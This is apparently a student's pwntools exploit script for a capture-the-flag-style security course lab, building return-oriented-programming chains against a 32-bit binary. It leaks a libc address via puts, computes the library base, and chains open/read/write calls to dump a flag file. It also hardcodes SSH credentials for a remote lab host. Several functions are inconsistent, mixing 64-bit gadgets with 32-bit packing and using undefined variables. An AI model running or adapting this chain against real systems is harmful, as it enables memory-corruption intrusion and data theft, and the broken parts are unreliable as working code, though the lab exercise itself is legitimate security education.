#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32
debug = False
exe = "./target"
libs = "/lib/i386-linux-gnu/libc.so.6"

ip = '52.201.10.159'
user = 'lab06'
myPassword = '27b69684'
p = process(exe)
padding = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapa'

# ropper --file ./target --search "pop rdi; ret"
# ropper --file ./target --search 'pop rsi; pop %; ret'
# ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search 'pop rdx; ret'

# ropper --file ./target --search "pop %; ret"
pop1 = 0x0804879b
pop2 = 0x0804879a
pop3 = 0x08048799

# arg3
# 0x0000000000001b96: pop rdx; ret;
# NOTE because this is coming from the libc, we need to append the base
# address to this value.
popRdx = 0x0000000000001b96


if args['JAKE']:
    debug = True

if args['REMOTE']:
    s = ssh(user, ip, password=myPassword)
    p = s.process(exe, cwd='/home/lab06/tut06-advrop')

def getModules(exe):
    elf  = ELF(exe)
    libs = gdb.find_module_addresses(exe)
    libs += [elf]

    for lib in libs:
        log.info("%#8x %s" % (lib.address, os.path.basename(lib.path)))

    return libs

# Find our addresses
target_binary = ELF(exe)
libc_binary = ELF(libs) #getModules(exe)
assert(libc_binary != None)

def writeToFile(payload, append=False):
    # Write shellcode to a binary
    if append == True:
        f = open('shellcode', 'a')
    else:
        f = open('shellcode', 'w')
    f.write(payload)
    f.close()

def exec_fmt(payload):
    p = process(exe)
    p.sendline(payload)
    return p.recvall()

def getOffset():
    return FmtStr(exec_fmt).offset

def getLeak(leak):
    return int(leak[12:20], 16)

def getAddrOfString(e, string):
    for address in e.search(string):
        addr = int(hex(address), 16)
        print addr
    assert(addr != None)
    return addr

def getBase(leak):
    base = leak - libc_binary.symbols['puts']
    print 'base: 0x%x\n' % base
    return base
    
def leakPutsPayload(padding):
    '''
    payload1:
    '''
    rop = ROP(target_binary)
    rop.raw(target_binary.plt['puts'])
    rop.raw(pop1)
    rop.raw(target_binary.got['puts'])
    rop.raw(target_binary.symbols['start'])
    rop.raw(0xdeadbeef)
    print rop.dump()

    payload = padding + rop.chain()

    writeToFile(payload)
    log.success('Payload %s\n', payload)
    print "\n"
    p.sendline(payload)
    a = p.recvline()
    b = p.recvline()
    '''
    print 'a %s\n' % a
    print 'b %s\n' % b
    '''
    binString = b.ljust(32, '0')
    packedBinString = hex(unpack(binString, 'all', endian='little', sign=False))
    lenPackedBinString = len(packedBinString)
    unpackedStringAddr = packedBinString[lenPackedBinString-8:lenPackedBinString]
    unpackedAddr = int(unpackedStringAddr, 16)
    print 'leaked putsGot: ' + hex(unpackedAddr & 0xffffffff)
    return (unpackedAddr & 0xffffffff)


# Get the leaked addresses
leak = leakPutsPayload(padding)
base = getBase(leak)

# This pop comes from different library. Need to apply base to find it.
popRdx = popRdx + base

def payload1(padding):
    '''
    [buf  ]
    [.....]
    [ra   ] -> pop rdi; ret
    [arg1 ] -> "Password OK :)"
    [ra   ] -> puts@plt
    [ra   ] (crashing)
    '''
    rop = ROP(target_binary)
    arg1 = getAddrOfString(target_binary, 'main')
    rop.call('puts', [0x804932b])
    print rop.dump()
    dummy = 0xdeadbeef
    return padding + rop.chain() + p32(dummy)

def payload2(padding):
    '''
    payload2:
    [buf  ]
    [.....]
    [ra   ] -> pop rdi; ret
    [arg1 ] -> "/bin/sh"
    [ra   ] -> system@libc

    '''
    leak = leakPutsPayload(padding)
    base = getBase(leak)

    # This will always be true
    binShOffset = 0x7ffff7b97e9a - 0x7ffff7a649c0

    tmp = 0x804a000
    dummy = 0xdeadbeef

    ra_printf = libc_binary.symbols['puts'] + base
    arg1 = binShOffset + leak
    ra_exit = libc_binary.symbols['exit'] + base
    return padding + p64(popRdx) + p64(arg1) + p64(ra_printf)

def payload2_rop(padding):    
    '''
    payload2:
    [buf  ]
    [.....]
    [ra   ] -> pop rdi; ret
    [arg1 ] -> "/bin/sh"
    [ra   ] -> system@libc
    '''

    libc_binary = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    leak = leakPutsPayload(padding)
    base = leak - libc_binary.symbols['puts']
    print 'base: 0x%x\n' % base

    rop = ROP(target_binary, base=myBase)

    # Create payload
    rop.raw(libc_binary.symbols['open'] + base)
    rop.raw(pop2)
    rop.raw(0x804932b)
    rop.raw(0)
    
    rop.raw(libc_binary.symbols['read'] + base)
    rop.raw(pop3)
    rop.raw(3)
    rop.raw(tmp)
    rop.raw(1040)
    
    rop.raw(libc_binary.symbols['write'] + base)
    rop.raw(pop3)
    rop.raw(1)
    rop.raw(tmp)
    rop.raw(1040)
    

    print rop.dump()
    return padding + rop.chain()

def payload3(padding):
    '''
    Goal is to open this:
    (assume: symlinked anystring -> /proc/flag)

    1) open("anystring", 0)
    2) read(3, tmp, 1040)
    3) write(1, tmp, 1040)
    '''

    leak = leakPutsPayload(padding)
    base = leak - libc_binary.symbols['puts']
    myBase = base
    print 'base: 0x%x\n' % base


    # gdb; b main; run; vmmap; search for something writable in the program
    '''
    0x400000 0x401000 r-xp 1000 0    /home/vagrant/cs6265/lab06/tut06-advrop/target
    0x600000 0x601000 r--p 1000 0    /home/vagrant/cs6265/lab06/tut06-advrop/target
    0x601000 0x602000 rw-p 1000 1000 /home/vagrant/cs6265/lab06/tut06-advrop/target
    '''

    tmp = 0x804a000
    dummy = 0xdeadbeef
    rop = ROP(target_binary, base=myBase)

    # Create payload
    rop.raw(libc_binary.symbols['open'] + base)
    rop.raw(pop2)
    rop.raw(0x804932b)
    rop.raw(0)
    
    rop.raw(libc_binary.symbols['read'] + base)
    rop.raw(pop3)
    rop.raw(3)
    rop.raw(tmp)
    rop.raw(1040)
    
    rop.raw(libc_binary.symbols['write'] + base)
    rop.raw(pop3)
    rop.raw(1)
    rop.raw(tmp)
    rop.raw(1040)
    
    print rop.dump()
    return padding + rop.chain()


def payload4(padding):
    '''
    Goal is to open this:
    (assume: symlinked anystring -> /proc/flag)

    1) open("anystring", 0)
    2) read(3, tmp, 1040)
    3) write(1, tmp, 1040)
    '''
    return padding + rop.chain()


payload = payload3(padding)
log.success('Payload %s\n', payload)
writeToFile(payload, append=True)

if debug == True:
    script = '''
    b main
    r < <(cat shellcode)
    '''.format(payload)
    print script
    gdb.attach(p, script)
else:
    p.sendline(payload)
    p.interactive()
    print p.recvall()

#print hex(p.recvline())
